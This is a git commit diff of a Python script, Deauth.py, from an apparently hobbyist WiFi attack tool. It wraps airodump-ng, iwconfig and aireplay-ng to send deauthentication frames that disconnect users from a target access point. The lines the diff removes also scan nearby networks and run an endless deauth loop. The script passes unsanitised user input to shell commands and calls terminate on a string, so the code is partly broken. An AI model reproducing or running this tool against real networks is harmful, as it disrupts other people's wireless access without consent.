2e914f0975326543b25ae5a35a9dc84b0f8b3e3b
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2024-01-05 14:17:52 +0000

    Update Deauth.py

--- SRC/Deauth.py
+++ SRC/Deauth.py
@@ -1,96 +1,74 @@
-# Code for deauth going to be here
-from time import sleep, strftime
-import pywifi
-from pywifi import const
-import os
-import datetime
+# Code for deauth
+
+# ------ [ Moduly ] ------ #
+import time
 import subprocess
-
-datum = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
-
-reset = '\033[0m'
-red = '\033[31m'
-green = '\033[32m'
-yellow = '\033[33m'
-orange = '\033[33m\033[31m'
-blue = '\033[34m'
+import os
+# ------ [ Farby ] ----- #
+red = '\033[91m'
+orange = '\033[38;5;208m'
+purple = '\033[95m'
+green = '\033[92m'
+blue = '\033[94m'
 magenta = '\033[35m'
+yellow = '\033[93m'
+cyan = '\033[96m'
+reset = '\033[0m'
 
-folder = "/home/kali/Desktop/WiFiScanResult"
+#def main():
+#    # ------ [ INPUTY ] ------ #
+#    RouterTargetMAC = input("Write MAC Addres for deauth : ")
+#    SetChannel = input("Write Channel (need to be same as Target WiFi Channel) between 1 - 12 : ")
+#    DeauthFrames = input(f"Set number for deauth frames to {RouterTargetMAC} : ")
+#    
+#    if DeauthFrames ==" " or DeauthFrames.isspace():
+#        print(f"Setting Up Default Frames to {green}20{reset}")
+#        DeauthFrames = "20"
+#    time.sleep(1)
+#    print(f"Changing Channel to {green}{SetChannel}{reset}")
+#    Channel = subprocess.run(["sudo", "iwconfig", "wlan1", "channel", SetChannel], capture_output=True, text=True)
+#
+#    if Channel.returncode == 0:
+#        time.sleep(1)
+#        IWlistOutput = subprocess.run(["iwlist", "wlan1", "channel"], capture_output=True, text=True)
+#
+#        if IWlistOutput.stdout and f"(Channel {SetChannel})" in IWlistOutput.stdout:
+#
+#            print(f"Starting deauth attack on {RouterTargetMAC} MAC Address ...\n")
+#            deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", DeauthFrames, RouterTargetMAC, "wlan1"],stderr=subprocess.PIPE)
+#            #time.sleep(1)
+#            #print("! Time OUT ! Cancelled ...")
+#            if os.system(deauth):
+#               print("Still in process...")
+#            else:
+#               print("Cancelled ...")
+#        else:
+#            print("Some error occurred with check if is correct Channel as set channel")
 
-if not os.path.exists(folder):
-    os.makedirs(folder)
 
-filename = os.path.join(folder, f"{datum}.txt")
+def main():    #------------ FUNGUJE TOOOO KONECNEEE ------------#
 
-security_type_mapping = {
-    const.AKM_TYPE_NONE: "None",
-    const.AKM_TYPE_WPA: "WPA",
-    const.AKM_TYPE_WPAPSK: "WPA-PSK",
-    const.AKM_TYPE_WPA2: "WPA2",
-    const.AKM_TYPE_WPA2PSK: "WPA2-PSK",
-    const.AKM_TYPE_UNKNOWN: "Unknown",
-}
+    time.sleep(1)
+    WiFiDump = f"sudo airodump-ng wlan1"
+    subprocess.run(WiFiDump, shell=True)
+    time.sleep(10)
+    WiFiDump.terminate()
 
-def freq_to_channel(freq):
-    if 2412 <= freq <= 2484:
-        return (freq - 2412) // 5 + 1
-    elif 5180 <= freq <= 5825:
-        return (freq - 5180) // 5 + 36
-    else:
-        return None
-
-def get_security_type_name(security_type):
-    return security_type_mapping.get(security_type, "Unknown")
-
-def scan_wifi():
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
-    iface.scan()
-    sleep(2)
-    scan_results = iface.scan_results()
-
-    for result in scan_results:
-        ssid = result.ssid
-        bssid = result.bssid
-        freq = result.freq
-        channel = freq_to_channel(freq)
-        security_type = get_security_type_name(result.akm[0])
-        signal_strength = result.signal
-
-        print(f"\n\n[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]")
-        print(f"{yellow}SSID{reset}: {green}{ssid}{reset}")
-        print(f"{yellow}MAC{reset} : {green}{bssid}{reset}")
-        print(f"{yellow}CH{reset}  : {green}{channel}{reset}, {yellow}Freq: {reset}{green}{freq}{reset}")
-        print(f"{yellow}SecType{reset}: {green}{security_type}{reset}")
-        print(f"{yellow}Signal{reset} : {green}{signal_strength}{reset} {yellow}dB{reset}")
-        print(f"[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]")
-
-def deauth_attack(target_ssid, iface):
-    subprocess.run(["sudo", "iw", "dev", iface, "interface", "add", "mon0", "type", "monitor"])
-    subprocess.run(["sudo", "ifconfig", "mon0", "up"])
-    subprocess.run(["sudo", "iw", "mon0", "del"])
-    subprocess.run(["sudo", "iw", "dev", iface, "del"])
-    subprocess.run(["sudo", "iw", "dev", iface, "interface", "add", iface, "type", "managed"])
-    subprocess.run(["sudo", "ifconfig", iface, "up"])
+    RouterTargetMAC = str(input("Write MAC Address for deauth: "))
+    SetChannel = str(input("Write Channel (needs to be the same as the Target WiFi Channel) between 1 - 14: "))
+    DeauthFrames = str(input(f"Set the number of deauth frames for {RouterTargetMAC}: "))
+ 
+#   Path for change Channel to same as using Target WiFi
+    IwCommand = f"sudo iwconfig wlan1 channel {SetChannel}"
+    subprocess.run(IwCommand, shell=True)
+#   Path for Deauth - Disconnect users from Speciffic WiFi MAC Address
+    command = f"sudo aireplay-ng --deauth {DeauthFrames} -a {RouterTargetMAC} wlan1"
+    subprocess.run(command, shell=True)
 
     while True:
-        subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_ssid, iface])
-
-def main():
-    while True:
-        print(f"[{magenta}+{reset}]" + "--" * 20 + f"[{magenta}+{reset}]\n")
-        print(f"[{magenta}+{reset}] Starting WiFi Scanner & Deauthentication Attack [{magenta}+{reset}]")
-        print(f"\nScanning nearby networks...\n")
-        sleep(2)
-        print(f"   : -------- {red}Scan Results{reset} --------:")
-        scan_wifi()
-
-        target_ssid = input("\nEnter the target SSID for deauthentication attack (Ctrl+C to exit): ")
-        iface = input("Enter the WiFi adapter for attack (e.g., wlan0): ")
-
-        deauth_attack(target_ssid, iface)
-        sleep(3)
-
-if __name__ == "__main__":
-    main()
+        GoAgain = input("Do you want to send Deauth frames again ? [Y/ N] ")
+        if GoAgain =="y":
+            continue
+        else:
+            print("Cancelling ... BB")
+            break
